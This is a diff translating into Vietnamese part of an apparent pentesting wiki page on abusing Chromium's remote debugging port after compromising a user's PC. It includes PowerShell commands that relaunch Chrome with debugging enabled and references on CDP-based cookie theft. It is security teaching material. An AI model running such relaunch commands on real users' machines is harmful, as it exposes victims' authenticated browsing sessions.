-In a real environment and **after compromising** a user PC that uses a Chromium-based browser, a historical technique was to relaunch the browser with debugging enabled and forward the loopback port. This can expose the victim's browsing state on products/builds that still accept the selected profile, but Chrome 136+ will not honor this against its default data directory.<sup>[[7]](#references)[[14]](#references)</sup>
+Trong môi trường thực tế, **sau khi xâm nhập** một PC của người dùng có trình duyệt dựa trên Chromium, một kỹ thuật từng được sử dụng là khởi chạy lại trình duyệt với debugging được bật và chuyển tiếp cổng loopback. Cách này có thể làm lộ trạng thái duyệt web của nạn nhân trên các sản phẩm/bản dựng vẫn chấp nhận profile được chọn, nhưng Chrome 136+ sẽ không áp dụng cách này với thư mục dữ liệu mặc định.<sup>[[7]](#references)[[14]](#references)</sup>
 
-The original relaunch command is preserved below for older/version-specific targets. The second command is the supported current-Chrome form, but it creates an isolated profile rather than reopening the victim's normal authenticated state.<sup>[[7]](#references)[[14]](#references)</sup>
+Lệnh khởi chạy lại ban đầu được giữ bên dưới để dùng với các mục tiêu phiên bản cũ/cụ thể. Lệnh thứ hai là cách được Chrome hiện tại hỗ trợ, nhưng nó tạo một profile tách biệt thay vì mở lại trạng thái xác thực thông thường của nạn nhân.<sup>[[7]](#references)[[14]](#references)</sup>
 
 ```powershell
 # Historical: verify whether the target actually honors it
@@ -258,28 +258,28 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
 ```
 
-For macOS-specific Chromium relaunch, extension, and CDP tradecraft, see [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).
+Để xem tradecraft đặc thù cho macOS về khởi chạy lại Chromium, extension và CDP, hãy xem [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).
 
 
 
 ## References
 
 - [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
-- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
-- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
-- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/learn/getting-started/debugging)
+- [2] [taviso/cefdebug - Công cụ kiểm tra và khai thác debugger CEF/Chromium](https://github.com/taviso/cefdebug)
+- [3] [CVE-2019-1414: Thực thi mã từ xa qua Chrome DevTools Debugger trong Visual Studio Code](https://iwantmore.pizza/posts/cve-2019-1414.html)
+- [4] [Hướng dẫn Debugging của Node.js - Bắt đầu](https://nodejs.org/learn/getting-started/debugging)
 - [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
-- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
-- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
-- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
-- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
-- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
-- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
-- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
-- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
-- [14] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
-- [15] [Injecting CDP into a Running Edge Browser: A Deep Dive into Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
+- [6] [Bài viết về corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
+- [7] [Post-Exploitation: Lạm dụng tính năng debugging của Chrome để quan sát và điều khiển từ xa các phiên duyệt web](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
+- [8] [CVE-2021-38112: Thực thi mã từ xa trên AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
+- [9] [Bạn đang nói chuyện với tôi à? - WebDriver RCE qua DNS Rebinding và CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
+- [10] [Counter Webdriver - Từ Bot đến RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
+- [11] [Google Project Zero Issue 773 (trình theo dõi lỗi Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
+- [12] [Google Project Zero Issue 1742 (trình theo dõi lỗi Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
+- [13] [Google Project Zero Issue 1944 (trình theo dõi lỗi Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
+- [14] [Thay đổi các switch remote debugging để tăng cường bảo mật - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
+- [15] [Injecting CDP vào trình duyệt Edge đang chạy: Phân tích chuyên sâu về instrument trình duyệt khi chạy](https://deathflamingo.com/blog/cdp_enabler/)
 - [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
 - [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
-- [18] [SpecterOps - Return of the Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
+- [18] [SpecterOps - Sự trở lại của Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
 {{#include ../../banners/hacktricks-training.md}}
